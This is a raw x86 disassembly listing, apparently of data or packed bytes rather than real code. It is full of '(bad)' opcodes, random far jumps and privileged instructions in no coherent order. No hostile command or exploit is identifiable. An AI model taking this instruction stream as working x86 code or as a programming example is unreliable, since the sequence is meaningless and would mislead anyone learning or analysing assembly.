  42f8ee:	fisubr DWORD PTR [esp+ecx*2+0x7]
  42f8f2:	jmp    0xebb9edfa
  42f8f7:	clc    
  42f8f8:	jge    0x42f936
  42f8fa:	jmp    FWORD PTR [esi]
  42f8fc:	jo     0x42f910
  42f8fe:	jmp    0x45670c
  42f903:	imul   edi,esi,0x8a640afc
  42f909:	or     DWORD PTR [eax],eax
  42f90b:	jmp    0xbc43bcc0
  42f910:	sar    ebx,1
  42f912:	push   es
  42f913:	jmp    0xf4397b8e
  42f918:	dec    edx
  42f919:	pusha  
  42f91a:	test   DWORD PTR [edi],ebp
  42f91c:	bound  esp,QWORD PTR [esi]
  42f91e:	xchg   esi,eax
  42f91f:	fstp   QWORD PTR [ebx+ebx*2-0xd]
  42f923:	bnd jbe 0x42f928
  42f926:	and    BYTE PTR [edx-0x7c],0xfd
  42f92a:	sbb    DWORD PTR [ebp+0x7f],0x2
  42f92e:	add    BYTE PTR [ecx-0x62],ch
  42f931:	pop    es
  42f932:	or     ebp,DWORD PTR [ebp-0x72]
  42f935:	pop    es
  42f936:	add    cl,ch
  42f938:	mul    BYTE PTR [ebx]
  42f93a:	jmp    FWORD PTR [ecx+0x3b]
  42f93d:	or     bh,bl
  42f93f:	push   0x0
  42f941:	add    BYTE PTR [eax],al
  42f943:	add    BYTE PTR [eax],al
  42f945:	xor    edi,esi
  42f947:	cli    
  42f948:	jae    0x42f900
  42f94a:	std    
  42f94b:	pop    ds
  42f94c:	fstp   st(1)
  42f94e:	cld    
  42f94f:	jge    0x42f8ff
  42f951:	jg     0x42f955
  42f953:	add    ch,cl
  42f955:	fdiv   st(4),st
  42f957:	add    dh,0x6f
  42f95a:	add    al,BYTE PTR [eax]
  42f95c:	out    dx,al
  42f95d:	adc    BYTE PTR [ecx+0x260afc1],dh
  42f963:	ret    0x77a7
  42f966:	add    edi,DWORD PTR [edi-0x1f]
  42f969:	test   al,0xec
  42f96b:	inc    edi
  42f96c:	push   ebp
  42f96d:	mov    ecx,0xad2ae7f0
  42f972:	ss dec eax
  42f974:	push   ebp
  42f975:	gs icebp 
  42f977:	out    0x0,eax
  42f979:	(bad)  
  42f97a:	jns    0x42f99b
  42f97c:	dec    eax
  42f97d:	dec    eax
  42f97e:	push   cs
  42f97f:	jnp    0x42f969
  42f981:	cwde   
  42f982:	jns    0x42f98f
  42f984:	dec    eax
  42f985:	mov    ds:0x8c0b0f7a,eax
  42f98a:	add    eax,0xfb6a46be
  42f98f:	loop   0x42f9f0
  42f991:	sbb    al,BYTE PTR [edi+0x10]
  42f994:	or     edi,esi
  42f996:	dec    ebp
  42f997:	rol    BYTE PTR [esi+0x3a],0x3
  42f99b:	jecxz  0x42f9f0
  42f99d:	sbb    al,BYTE PTR [edi+0x10]
  42f9a0:	add    edi,esi
  42f9a2:	push   ecx
  42f9a3:	rol    BYTE PTR [esi+0x2a],0x5
  42f9a7:	jecxz  0x42f9f0
  42f9a9:	add    BYTE PTR [eax],al
  42f9ab:	add    BYTE PTR [eax],al
  42f9ad:	add    BYTE PTR [edx-0x38faefb9],cl
  42f9b3:	inc    esi
  42f9b4:	rol    BYTE PTR [esi+0x2a],0xa
  42f9b8:	jecxz  0x42f9f5
  42f9ba:	(bad)  
  42f9bb:	fld    QWORD PTR [ebp+0x74]
  42f9be:	push   ds
  42f9bf:	cmp    eax,0x3cc4296e
  42f9c4:	outs   dx,BYTE PTR ds:[esi]
  42f9c5:	pop    ds
  42f9c6:	aam    0x78
  42f9c8:	adc    BYTE PTR [eax-0x38],cl
  42f9cb:	adc    DWORD PTR [eax+0xf],ecx
  42f9ce:	mov    DWORD PTR [edi-0x3923fffc],edi
  42f9d4:	inc    eax
  42f9d5:	push   ss
  42f9d6:	rcr    ebx,cl
  42f9d8:	push   ss
  42f9d9:	(bad)  
  42f9da:	sbb    dl,BYTE PTR [edi]
  42f9dc:	(bad)  
  42f9dd:	jmp    0xdbaa:0x1640c6ba
  42f9e4:	or     al,dh
  42f9e6:	sbb    dl,BYTE PTR [edi]
  42f9e8:	adc    bl,ch
  42f9ea:	(bad)  
  42f9eb:	mov    BYTE PTR [eax+0x16],0xcf
  42f9ef:	fsin   
  42f9f1:	lds    ebx,FWORD PTR [edx+0x18]
  42f9f4:	inc    ch
  42f9f6:	jne    0x42fa19
  42f9f8:	dec    DWORD PTR ds:0xfa79678c
  42f9fe:	call   0x5e3:0xf90a58de
  42fa05:	add    BYTE PTR [ebp-0x1b],dh
  42fa08:	leave  
  42fa09:	adc    DWORD PTR [edx-0x7],esi
  42fa0c:	xchg   BYTE PTR ds:[ecx-0x22],dh
  42fa10:	sar    DWORD PTR [esi+0x0],cl
  42fa16:	add    BYTE PTR [esi-0x6a0981a7],dh
  42fa1c:	push   cs
  42fa1d:	adc    eax,DWORD PTR [esi-0x4df4a335]
  42fa23:	pop    edi
  42fa24:	fidivr DWORD PTR [edi]
  42fa26:	add    esi,DWORD PTR [ebp+0x76]
  42fa29:	add    eax,0xf5ab3c2
  42fa2e:	jmp    0x4154c1
  42fa33:	out    dx,eax
  42fa34:	scas   eax,DWORD PTR es:[edi]
  42fa35:	dec    DWORD PTR [edx]
  42fa37:	jmp    0x42fa1c
  42fa39:	xor    eax,0x8268721c
  42fa3e:	sbb    esi,DWORD PTR [ecx+ebx*2-0x2]
  42fa42:	jg     0x42fa60
  42fa44:	pop    edi
  42fa45:	icebp  
  42fa46:	sub    ebp,esi
  42fa48:	ret    
  42fa49:	(bad)  
  42fa4a:	je     0x42fac7
  42fa4c:	fnstcw WORD PTR [eax+0x47]
  42fa4f:	mov    BYTE PTR [edx+0x44],ah
  42fa52:	inc    ecx
  42fa53:	arpl   WORD PTR [ebx+0x65],bp
  42fa56:	add    esi,DWORD PTR [ecx+ebx*2-0x2]
  42fa5a:	jg     0x42fa4b
  42fa5c:	pop    ebx
  42fa5d:	or     eax,DWORD PTR [ebp-0x19c52]
  42fa63:	cmc    
  42fa64:	add    al,0xd4
  42fa66:	or     bh,al
  42fa68:	sbb    eax,DWORD PTR [esi]
  42fa6a:	add    BYTE PTR [ebp+0x1f],dh
  42fa6d:	ret    0x6d11
  42fa70:	add    ah,BYTE PTR [edi-0x1]
  42fa73:	mov    edx,0xad83e902
  42fa78:	cld    
  42fa79:	push   ebx
  42fa7a:	fadd   DWORD PTR [eax]
  42fa7c:	add    BYTE PTR [eax],al
  42fa7e:	add    BYTE PTR [eax],al
  42fa80:	sub    ch,BYTE PTR [edi+eiz*8-0xa]
  42fa84:	data16 or ch,0xcc
  42fa88:	and    ecx,edi
  42fa8a:	stos   BYTE PTR es:[edi],al
  42fa8b:	lds    esp,FWORD PTR [ebx+edi*8-0x31]
  42fa8f:	push   edx
  42fa90:	mov    ch,BYTE PTR [edi-0x18]
  42fa93:	or     DWORD PTR [eax-0xadccbff],0x6b
  42fa9a:	sub    esi,edi
  42fa9c:	jge    0x42fae6
  42fa9e:	and    dl,BYTE PTR [esi]
  42faa0:	jp     0x42fafb
  42faa2:	push   edx
  42faa3:	add    esi,DWORD PTR [ebp+0x2]
  42faa6:	imul   edi,DWORD PTR [ecx+0x75],0x4b83f2f5
  42faad:	sbb    eax,0xc8370af4
  42fab2:	ficom  DWORD PTR [edi]
  42fab4:	dec    esp
  42fab5:	fwait
  42fab6:	call   0x5ec56fbe
  42fabb:	add    DWORD PTR [esi-0x7b],edi
  42fabe:	(bad)  
  42fabf:	or     DWORD PTR [ebp+0x2],esi
  42fac2:	imul   edi,DWORD PTR [eax-0x4b],0x70ea63ff
  42fac9:	add    ch,cl
  42facb:	inc    ebp
  42facc:	mov    ah,0x18
  42face:	fsubr  DWORD PTR [edx-0x6]
  42fad1:	add    ecx,ebp
  42fad3:	add    esi,ebp
  42fad5:	push   0x8262f6d2
  42fada:	push   ds
  42fadb:	add    bh,BYTE PTR [esi-0x7b]
  42fade:	mov    dh,0x9
  42fae0:	jne    0x42fae4
  42fae2:	imul   edi,DWORD PTR [eax+0x0],0x0
  42fae9:	cmp    edi,edi
  42faeb:	arpl   dx,cx
  42faed:	jo     0x42faf1
  42faef:	jmp    0xeb5b2f39
  42faf4:	push   0xf2ff825b
  42faf9:	je     0x42faf0
  42fafb:	and    eax,0x73703f69
  42fb00:	or     al,0xf9
  42fb02:	ja     0x42fb51
  42fb04:	push   esp
  42fb05:	ja     0x42fb4b
  42fb07:	inc    ecx
  42fb08:	(bad)  
  42fb09:	jp     0x42fb72
  42fb0b:	pop    ecx
  42fb0c:	imul   ebx,DWORD PTR [edx],0x34ef74d6
  42fb12:	rcl    DWORD PTR [ecx],0xe5
  42fb15:	sbb    eax,eax
  42fb17:	jg     0x42facb
  42fb19:	mov    eax,0x68d384fb
  42fb1e:	add    al,BYTE PTR [eax]
  42fb20:	scas   eax,DWORD PTR es:[edi]
  42fb21:	aaa    
  42fb22:	adc    al,0x18
  42fb24:	xchg   edx,eax
  42fb25:	xor    eax,0x65ebf5ee
  42fb2a:	push   cs
  42fb2b:	adc    BYTE PTR [eax+0x6906f775],0xd2
  42fb32:	mov    edi,0xc3b4b474
  42fb37:	adc    eax,edx
  42fb39:	rcr    DWORD PTR [eax],cl
  42fb3b:	xor    BYTE PTR [eax+0x6e],0xf7
  42fb3f:	and    eax,0x74bcb269
  42fb44:	add    al,0xb7
  42fb46:	ret    
  42fb47:	adc    esi,edi
  42fb49:	xchg   ebx,eax
  42fb4a:	or     BYTE PTR [eax+0x53],al
  42fb50:	add    BYTE PTR [eax],al
  42fb52:	jne    0x42fb4d
  42fb54:	test   BYTE PTR [esi+0x69000281],ah
  42fb5a:	mov    cl,bh
  42fb5c:	or     ch,BYTE PTR [edi+eiz*1-0x5]
  42fb60:	(bad)  
  42fb61:	call   0xf692705c
  42fb66:	cmc    
  42fb67:	mov    esi,0x4076e908
  42fb6c:	inc    ecx
  42fb6d:	jmp    FWORD PTR [ebp+0x68]
  42fb70:	mov    ebp,0xe76cc761
  42fb75:	add    BYTE PTR [eax+0x5cfffffe],cl
  42fb7b:	in     eax,dx
  42fb7c:	sbb    cl,BYTE PTR [edi]
  42fb7e:	push   eax
  42fb7f:	lds    eax,FWORD PTR [edx]
  42fb81:	add    ah,cl
  42fb83:	test   BYTE PTR [esi+0x24],dh
  42fb86:	jl     0x42fb8e
  42fb88:	jne    0x42fb92
  42fb8a:	daa    
  42fb8b:	lods   eax,DWORD PTR ds:[esi]
  42fb8c:	push   ds
  42fb8d:	adc    BYTE PTR ds:0xc201ead,dl
  42fb93:	imul   edx,DWORD PTR [eax],0x5
  42fb96:	push   ecx
  42fb97:	add    bh,BYTE PTR [esi+0x7109d46]
  42fb9d:	mov    dh,0x52
  42fb9f:	pop    es
  42fba0:	or     bl,0xb4
  42fba3:	mov    ch,0xf0
  42fba5:	call   FWORD PTR [ebx]
  42fba7:	jns    0x42fbe9
  42fba9:	add    DWORD PTR [eax+0x6],ecx
  42fbac:	pop    es
  42fbad:	test   eax,esp
  42fbaf:	stc    
  42fbb0:	(bad)  
  42fbb1:	call   esi
  42fbb3:	inc    ebx
  42fbb4:	or     eax,0x24
  42fbb9:	add    BYTE PTR [eax],al
  42fbbb:	retf   0x605
  42fbbe:	jmp    0x42fa0e
  42fbc3:	int3   
  42fbc4:	in     al,dx
  42fbc5:	add    al,0x74
  42fbc7:	mov    ebx,0x500df181
  42fbcc:	fistp  QWORD PTR [edx-0x5]
  42fbcf:	jl     0x42fc43
  42fbd1:	jecxz  0x42fbbe
  42fbd3:	pop    ecx
  42fbd4:	xor    ecx,0x8011400a
  42fbda:	sti    
  42fbdb:	or     DWORD PTR [ebp+0x1],ebx
  42fbde:	xor    BYTE PTR [edi+0x52be7521],0x43
  42fbe5:	jmp    DWORD PTR [edx]
  42fbe7:	mov    bh,0x9
  42fbe9:	sub    eax,eax
  42fbeb:	add    bh,BYTE PTR [esi+0x40]
  42fbee:	adc    BYTE PTR [esi],al
  42fbf0:	(bad)  
  42fbf1:	push   edi
  42fbf2:	xor    BYTE PTR [ebp+0x10],0x8
  42fbf6:	(bad)  
  42fbf7:	in     al,dx
  42fbf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbf9:	adc    al,0xb
  42fbfb:	call   0xfd6ef71a
  42fc00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc01:	add    eax,DWORD PTR [edi-0x7ae1c0d7]
  42fc07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc08:	dec    ebx
  42fc09:	jp     0x42fc44
  42fc0b:	jge    0x42fc68
  42fc0d:	inc    BYTE PTR [esi-0x58698d6]
  42fc13:	sub    DWORD PTR [ebx],eax
  42fc15:	lea    eax,[ebx+0x51]
  42fc18:	imul   ebp,DWORD PTR [ebx],0xffffffbe
  42fc1b:	and    eax,0xfa45f0
  42fc20:	add    BYTE PTR [eax],al
  42fc22:	add    BYTE PTR [eax],al
  42fc24:	mov    ds:0x6f7343e5,al
  42fc29:	loope  0x42fbe8
  42fc2b:	adc    dl,BYTE PTR [ecx-0x27]
  42fc2e:	pop    es
  42fc2f:	(bad)  
  42fc30:	cli    
  42fc31:	sbb    edx,DWORD PTR [ecx]
  42fc33:	xchg   BYTE PTR [ebx-0x1284e58c],dh
  42fc39:	sbb    eax,0xe66a0b20
  42fc3e:	push   cs
  42fc3f:	not    DWORD PTR [edx-0x7b]
  42fc42:	test   BYTE PTR [ebx-0x6f],ah
  42fc45:	cmp    esi,edi
  42fc47:	call   0x415dc4
  42fc4c:	cmc    
  42fc4d:	lock and ecx,DWORD PTR [ebx]
  42fc50:	stc    
  42fc51:	in     eax,0x0
  42fc53:	add    BYTE PTR [ebp-0x27],dh
  42fc56:	jl     0x42fc9f
  42fc58:	jb     0x42fc38
  42fc5a:	fld    DWORD PTR [edi]
  42fc5c:	jne    0x42fcb7
  42fc5e:	inc    eax
  42fc5f:	inc    ecx
  42fc60:	je     0x42fc5f
  42fc62:	in     ax,0x72
  42fc65:	pop    ecx
  42fc66:	(bad)  
  42fc67:	jg     0x42fc67
  42fc69:	lea    eax,[edi]
  42fc6b:	test   DWORD PTR ds:0xbbfa791e,ebx
  42fc71:	add    ch,BYTE PTR [ebx+0x40599002]
  42fc77:	add    DWORD PTR [ebp+0x2],esi
  42fc7a:	imul   edi,DWORD PTR [ebp+0x46],0xce4263fb
  42fc81:	imul   eax,DWORD PTR [ecx],0x42
  42fc84:	xor    al,0x1
  42fc86:	ret    
  42fc87:	push   0x0
  42fc89:	add    BYTE PTR [eax],al
  42fc8b:	add    BYTE PTR [eax],al
  42fc8d:	mov    ah,0x3
  42fc8f:	jmp    0x98aaf197
  42fc94:	or     al,bh
  42fc96:	mov    dh,0xe4
  42fc98:	js     0x42fc49
  42fc9a:	inc    esp
  42fc9b:	and    al,BYTE PTR [ebx]
  42fc9d:	push   esi
  42fc9e:	pop    ecx
  42fc9f:	pushf  
  42fca0:	add    BYTE PTR [ebp+0x2],dh
  42fca3:	imul   edi,DWORD PTR [edi+ebx*2-0x5],0x6b8ea56b
  42fcab:	mov    ecx,0x1013441
  42fcb0:	imul   ebx,eax,0x3
  42fcb3:	jmp    0xb201fcbb
  42fcb8:	aaa    
  42fcb9:	jge    0x42fcb6
  42fcbb:	popa   
  42fcbc:	popf   
  42fcbd:	imul   ebp,DWORD PTR [ebx-0x6f],0xffffffe1
  42fcc1:	outs   dx,DWORD PTR ds:[esi]
  42fcc2:	lods   al,BYTE PTR ds:[esi]
  42fcc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fcc4:	loope  0x42fc99
  42fcc6:	pop    edx
  42fcc7:	mov    eax,0xd8c3fde1
  42fccc:	inc    ecx
  42fccd:	mov    ah,0x1
  42fccf:	shr    BYTE PTR [edx-0x48],0x3
  42fcd3:	jmp    0x12a9f1db
  42fcd8:	or     eax,esi
  42fcda:	mov    esp,0x441f785d
  42fcdf:	stos   BYTE PTR es:[edi],al
  42fce0:	add    dl,BYTE PTR [ebx+0x59]
  42fce3:	fadd   DWORD PTR [eax]
  42fce5:	jne    0x42fce9
  42fce7:	je     0x42fcad
  42fce9:	cmp    ch,BYTE PTR [esi]
  42fceb:	lock or dh,dh
  42fcee:	fcos   
  42fcf0:	xor    DWORD PTR [eax],eax
  42fcf2:	add    BYTE PTR [eax],al
  42fcf4:	add    BYTE PTR [eax],al
  42fcf6:	jge    0x42fd60
  42fcf8:	popa   
  42fcf9:	fisubr WORD PTR [esp+ebp*4]
  42fcfc:	popa   
  42fcfd:	push   0x5e
  42fcff:	sbb    esp,DWORD PTR [edx+0x70]
  42fd02:	mov    ah,0xfc
  42fd04:	shr    DWORD PTR [edi-0x4616dc89],0x75
  42fd0b:	add    al,BYTE PTR [eax]
  42fd0d:	imul   ecx,DWORD PTR [ecx-0x2],0xc134f074
  42fd14:	add    ch,al
  42fd16:	dec    edi
  42fd17:	sub    eax,0x8276e903
  42fd1c:	div    bl
  42fd1e:	jae    0x42fca6
  42fd20:	sbb    eax,0xe8682add
  42fd25:	inc    esp
  42fd26:	push   ds
  42fd27:	push   0x50e69fa
  42fd2c:	or     ebp,DWORD PTR [ebp+0x65]
  42fd2f:	outs   dx,BYTE PTR ds:[esi]
  42fd30:	cli    
  42fd31:	mov    esi,0xd12c0ef
  42fd36:	in     eax,0xf6
  42fd38:	adc    eax,eax
  42fd3a:	cmp    edx,0xffffffff
  42fd3d:	call   0xd643c0ea
  42fd42:	rcl    DWORD PTR [ebx],1
  42fd44:	add    ebp,ecx
  42fd46:	jbe    0x42fd45
  42fd48:	mov    cl,0xaa
  42fd4a:	(bad)  
  42fd4b:	jmp    0x6a74351f
  42fd50:	jle    0x42fcfb
  42fd52:	jp     0x42fdd2
  42fd54:	sub    dh,0x76
  42fd57:	add    bh,BYTE PTR [edi-0x13]
  42fd5a:	add    BYTE PTR [eax],al
  42fd5c:	add    BYTE PTR [eax],al
  42fd5e:	add    BYTE PTR [edx+0x7edc0006],dl
  42fd64:	or     DWORD PTR [ebx+0x5],0xd4b7b89
  42fd6b:	jge    0x42fd6a
  42fd6d:	mov    ecx,0x5e61f629
  42fd72:	add    BYTE PTR [edx-0x58],bl
  42fd75:	stc    
  42fd76:	call   FWORD PTR [edx-0x58]
  42fd79:	jmp    FWORD PTR ds:0xe87b21b8
  42fd7f:	rcr    DWORD PTR [ecx+0x18],1
  42fd82:	add    DWORD PTR [edx+eax*1+0x1241074],0xffffff85
  42fd8a:	pop    esi
  42fd8b:	int    0x5
  42fd8d:	add    dh,al
  42fd8f:	sbb    al,BYTE PTR [eax+ecx*1]
  42fd92:	jmp    0x3d6617
  42fd97:	call   0xc5:0x7506fca8
  42fd9e:	add    BYTE PTR [edi+eiz*1-0x2966fdbf],bl
  42fda5:	mov    ah,0x6
  42fda7:	mov    WORD PTR ds:0xfe8e46be,es
  42fdad:	call   0x489863
  42fdb2:	(bad)  
  42fdb4:	les    eax,FWORD PTR [eax+eax*4+0x3a3fdc]
  42fdbb:	or     ch,al
  42fdbd:	add    eax,0xfffe6e84
  42fdc2:	inc    DWORD PTR [eax]
  42fdc4:	add    BYTE PTR [eax],al
  42fdc6:	add    BYTE PTR [eax],al
  42fdc8:	arpl   WORD PTR [edi-0x7a5afdb8],dx
  42fdce:	test   DWORD PTR [ebx],0x68ce853
  42fdd4:	pop    esp
  42fdd5:	add    eax,0x2c124f7
  42fdda:	fadd   DWORD PTR [edx+0x4c]
  42fddd:	out    dx,eax
  42fdde:	inc    eax
  42fddf:	add    eax,DWORD PTR [eax]
  42fde1:	pusha  
  42fde2:	add    eax,0xc2eedc95
  42fde7:	and    al,0x1e
  42fde9:	(bad)  
  42fdea:	pop    eax
  42fdeb:	add    cl,BYTE PTR [eax*1+0x5c7546f6]
  42fdf2:	xor    ch,BYTE PTR [edx-0x7e]
  42fdf5:	out    dx,al
  42fdf6:	ds stc 
  42fdf8:	cmp    eax,0xb0e8fef7
  42fdfd:	pop    ebp
  42fdfe:	(bad)  
  42fdff:	(bad)  
  42fe00:	sti    
  42fe01:	cwde   
  42fe02:	std    
  42fe03:	cmp    esp,DWORD PTR [ebx-0x51]
  42fe06:	add    al,0x3c
  42fe08:	popa   
  42fe09:	jo     0x42fd9a
  42fe0b:	mov    edi,0x21b32e3
  42fe10:	int3   
  42fe11:	push   edx
  42fe12:	add    BYTE PTR [eax],al
  42fe14:	jne    0x42fe37
  42fe16:	mov    ebp,0xc61276fd
  42fe1b:	add    DWORD PTR [ebp+0x5b],esi
  42fe1e:	je     0x42fe61
  42fe20:	jbe    0x42fe07
  42fe22:	(bad)  
  42fe23:	(bad)  
  42fe24:	xor    dh,BYTE PTR [edx+0x7]
  42fe27:	or     esi,edx
  42fe29:	xchg   ebp,eax
  42fe2a:	add    eax,DWORD PTR [eax]
  42fe2c:	add    BYTE PTR [eax],al
  42fe2e:	add    BYTE PTR [eax],al
  42fe30:	add    BYTE PTR [ebp+0x58],dh
  42fe33:	lods   al,BYTE PTR ds:[esi]
  42fe34:	rcr    BYTE PTR [edi-0x23],1
  42fe37:	lahf   
  42fe38:	mov    DWORD PTR ds:0xc385035b,esi
  42fe3e:	pop    edx
  42fe3f:	(bad)  
  42fe40:	push   ebp
  42fe42:	inc    ecx
  42fe43:	push   es
  42fe44:	or     esi,eax
  42fe46:	idiv   cl
  42fe48:	push   DWORD PTR [edx-0x60]
  42fe4b:	mov    ecx,0x18927dfd
  42fe50:	add    dh,BYTE PTR [ebp+0x59]
  42fe53:	je     0x42fe96
  42fe55:	jbe    0x42fe3a
  42fe57:	sar    esi,0xd2
  42fe5a:	xchg   edx,eax
  42fe5b:	adc    ecx,DWORD PTR [ebx]
  42fe5d:	repnz mov BYTE PTR [ebx],0x0
  42fe61:	jne    0x42febb
  42fe63:	lods   al,BYTE PTR ds:[esi]
  42fe64:	sar    BYTE PTR [edi-0x25],1
  42fe67:	mov    bl,0x89
  42fe69:	mov    ch,0x59
  42fe6b:	add    eax,DWORD PTR [ebp+0x3e902f3]
  42fe71:	jne    0x42fdf5
  42fe73:	pop    edi
  42fe74:	add    eax,0xbe523912
  42fe79:	adc    edi,DWORD PTR [edx-0x66]
  42fe7c:	add    ch,dh
  42fe7e:	imul   esi,edx,0x72f784ec
  42fe84:	push   ebx
  42fe85:	inc    eax
  42fe86:	test   BYTE PTR [esi+eax*4],ch
  42fe89:	mov    dl,0x2
  42fe8b:	mov    ah,0xe8
  42fe8d:	push   0x69
  42fe8f:	repz add al,0xf8
  42fe92:	dec    ecx
  42fe93:	jecxz  0x42fe98
  42fe95:	add    BYTE PTR [eax],al
  42fe97:	add    BYTE PTR [eax],al
  42fe99:	add    BYTE PTR [ebp+0x40],dh
  42fe9c:	stos   BYTE PTR es:[edi],al
  42fe9d:	add    DWORD PTR [ebx+0x59],edi
  42fea0:	cmp    bh,bh
  42fea2:	retf   0x267
  42fea5:	mov    esi,0xaa79c3
  42feaa:	cmc    
  42feab:	imul   edx,edi,0x32f73cec
  42feb1:	push   ebx
  42feb2:	pusha  
  42feb3:	test   BYTE PTR [ebp+eax*4-0x3eabfd9e],bh
  42feba:	sbb    ch,BYTE PTR [ecx-0x8]
  42febd:	add    al,0xf8
  42febf:	mov    cl,0xe3
  42fec1:	add    esi,DWORD PTR [ebp+0x40]
  42fec4:	sub    al,BYTE PTR [edx]
  42fec6:	jp     0x42ff21
  42fec8:	nop
  42fec9:	(bad)  
  42feca:	jp     0x42ff33
  42fecc:	mov    dl,0xbd
  42fece:	jae    0x42ff49
  42fed0:	sbb    al,BYTE PTR [ecx]
  42fed2:	cmc    
  42fed3:	push   0xf794ece9
  42fed8:	push   edx
  42fed9:	push   edx
  42feda:	mov    al,ds:0x92858084
  42fedf:	add    dl,BYTE PTR [ecx+ebx*1]
  42fee2:	cmc    
  42fee3:	push   0x78f804ea
  42fee8:	jecxz  0x42feed
  42feea:	jne    0x42ff2c
  42feec:	jmp    FWORD PTR [esi]
  42feee:	ja     0x42fee6
  42fef0:	call   0xfaaa2a5e
  42fef5:	imul   ebx,DWORD PTR [ebp+0x9650b07],0xe8fffe
  42feff:	add    BYTE PTR [eax],al
  42ff01:	add    BYTE PTR [eax],al
  42ff03:	push   eax
  42ff04:	sar    ebp,0xe8
  42ff07:	lahf   
  42ff08:	fld    DWORD PTR [ecx+ebp*8]
  42ff0b:	jbe    0x42fe8f
  42ff0d:	test   BYTE PTR [ebx],0xa
  42ff10:	mov    edx,0x1b77afc1
  42ff15:	xchg   DWORD PTR [ebp+0x3b85068a],edx
  42ff1b:	jns    0x42ff9b
  42ff1d:	pop    eax
  42ff1e:	in     al,0x76
  42ff20:	add    al,BYTE PTR [edi-0x582816a]
  42ff26:	xchg   ebp,eax
  42ff27:	sahf   
  42ff28:	jg     0x42ff6d
  42ff2a:	int    0x66
  42ff2c:	pop    ds
  42ff2d:	mov    esi,0xfa38ed99
  42ff32:	push   ds
  42ff33:	xor    esp,DWORD PTR [edi-0x3f031c8d]
  42ff39:	adc    cl,BYTE PTR ds:0x70fefafa
  42ff3f:	scas   eax,DWORD PTR es:[edi]
  42ff40:	adc    eax,DWORD PTR [esi+0x7b1e6e2f]
  42ff46:	popa   
  42ff47:	mov    ebp,0xedf60b22
  42ff4c:	sbb    bh,al
  42ff4e:	mov    esi,0xd63e806
  42ff53:	test   DWORD PTR [edx],eax
  42ff55:	jmp    0x457b63
  42ff5a:	imul   edx,edx,0xace774f6
  42ff60:	ret    
  42ff61:	add    bl,bl
  42ff63:	mov    bl,0x95
  42ff65:	jg     0x42fef9
  42ff67:	add    BYTE PTR [eax],al
  42ff69:	add    BYTE PTR [eax],al
  42ff6b:	add    BYTE PTR [ebx-0x7],cl
  42ff6e:	test   BYTE PTR [eax],al
  42ff70:	(bad)  
  42ff71:	sti    
  42ff72:	(bad)  
  42ff73:	call   DWORD PTR [edx]
  42ff75:	cmp    edi,edi
  42ff77:	sub    al,0xf7
  42ff79:	lahf   
  42ff7a:	jp     0x42ff77
  42ff7c:	cmp    al,0x1
  42ff7e:	test   ch,bh
  42ff80:	adc    BYTE PTR [edx],al
  42ff82:	add    BYTE PTR [eax-0x7bfa9869],al
  42ff88:	mov    al,0xfa
  42ff8a:	(bad)  
  42ff8b:	jmp    FWORD PTR [edi-0x42]
  42ff8e:	aaa    
  42ff8f:	inc    esp
  42ff90:	jo     0x42ff9c
  42ff92:	jne    0x42ff9c
  42ff94:	xchg   DWORD PTR [edx+0x1e],eax
  42ff97:	adc    BYTE PTR [ebp+0x42],dl
  42ff9a:	push   ds
  42ff9b:	adc    al,0x92
  42ff9d:	cmp    bh,bh
  42ff9f:	das    
  42ffa0:	fs cmp cl,bh
  42ffa3:	jg     0x42ff3c
  42ffa5:	add    esi,DWORD PTR [ebp+0x4d]
  42ffa8:	add    bh,BYTE PTR [ecx+0x1ae0140]
  42ffae:	cmp    DWORD PTR [eax+esi*4+0xd],eax
  42ffb2:	pop    es
  42ffb3:	test   BYTE PTR [edx+edi*8+0x7117ffff],al
  42ffba:	push   es
  42ffbb:	cmp    esp,DWORD PTR [ebp+ebp*2+0x1a608b26]
  42ffc2:	adc    al,0x8b
  42ffc4:	push   eax
  42ffc5:	sbb    dl,BYTE PTR [eax]
  42ffc7:	sub    ebx,esi
  42ffc9:	push   ecx
  42ffca:	or     esi,0xc083c8bb
  42ffd0:	add    BYTE PTR [eax],al
  42ffd2:	add    BYTE PTR [eax],al
  42ffd4:	add    BYTE PTR [eax+0x64],al
  42ffd7:	test   BYTE PTR [esi-0x5d],al
  42ffda:	sbb    eax,0xe9600c84
  42ffdf:	inc    eax
  42ffe0:	pop    ss
  42ffe1:	(bad)  
  42ffe2:	cmp    ecx,DWORD PTR ds:0x3ee69b24
  42ffe8:	and    al,0x4b
  42ffea:	add    BYTE PTR [ebp+0x6d847597],al
  42fff0:	cli    
  42fff1:	idiv   dh
  42fff3:	daa    
  42fff4:	adc    al,0x75
  42fff6:	xchg   edx,eax
  42fff7:	jns    0x42fffc
  42fff9:	jne    0x430056
  42fffb:	jle    0x42fff3
  42fffd:	jg     0x430065
  42ffff:	or     dl,al
  430001:	mov    bl,0x5a
  430003:	pop    ds
  430004:	out    0xd3,eax
  430006:	imul   edi,DWORD PTR [eax+0x41f17749],0xb
  43000d:	push   ebp
  43000e:	fcomp  DWORD PTR [ebx+0x8]
  430011:	sbb    DWORD PTR [edx-0x4dab8c45],0x1dac0ef2
  43001b:	leave  
  43001c:	std    
  43001d:	repnz pop ebx
  43001f:	xchg   DWORD PTR [ebp+0x71],ebx
  430022:	pop    ebx
  430023:	(bad)  
  430024:	jg     0x430099
  430026:	fwait
  430027:	pop    ebx
  430028:	push   ebp
  430029:	jno    0x430086
  43002b:	(bad)  
  43002c:	cmp    edx,DWORD PTR [esi+0x5c]
  43002f:	xchg   edi,eax
  430030:	mov    edi,0xd2322cb
  430035:	into   
  430036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430037:	jg     0x430077
  430039:	add    BYTE PTR [eax],al
  43003b:	add    BYTE PTR [eax],al
  43003d:	add    BYTE PTR [ebp-0x5f5045a],ah
  430043:	and    DWORD PTR [ebx],eax
  430045:	add    BYTE PTR [ebp+0x44],dh
  430048:	mov    al,0xbe
  43004a:	not    BYTE PTR [edx+0x33]
  43004d:	cdq    
  43004e:	in     al,dx
  43004f:	sbb    al,0xfc
  430051:	mov    BYTE PTR [ebx],ch
  430053:	pop    edi
  430054:	push   ebp
  430055:	sub    eax,0x3bfe5b71
  43005a:	push   cs
  43005b:	es test ecx,0xe9005933
  430062:	cwde   
  430063:	push   ebp
  430064:	(bad)  
  430065:	jmp    FWORD PTR [ecx+0x359500b8]
  43006b:	add    esp,DWORD PTR [ebx+0x70f3963c]
  430071:	retf   0x5b50
  430074:	cld    
  430075:	pop    es
